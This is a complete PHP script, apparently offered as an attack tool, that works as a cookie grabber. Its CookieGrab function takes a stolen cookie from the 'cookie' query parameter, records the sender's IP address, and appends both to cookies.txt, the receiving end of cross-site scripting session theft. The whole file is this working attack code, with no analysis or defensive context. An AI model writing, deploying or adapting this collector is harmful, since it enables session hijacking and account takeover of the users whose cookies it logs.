<?php


function CookieGrab() 
{ 
	$file = "cookies.txt"; 

    $cookie = $_GET['cookie'];
  

    $ip = getenv('REMOTE_ADDR');
  

    $cookiefile=fopen("$file", "a+"); 
  

    fwrite($cookiefile, "IP:" . $ip . PHP_EOL);
    fwrite($cookiefile, "Cookie: " . $cookie . PHP_EOL);
  
    fwrite($cookiefile, "" . PHP_EOL);
    fwrite($cookiefile, "" . PHP_EOL);
    fwrite($cookiefile, "" . PHP_EOL);
}
CookieGrab();


?>
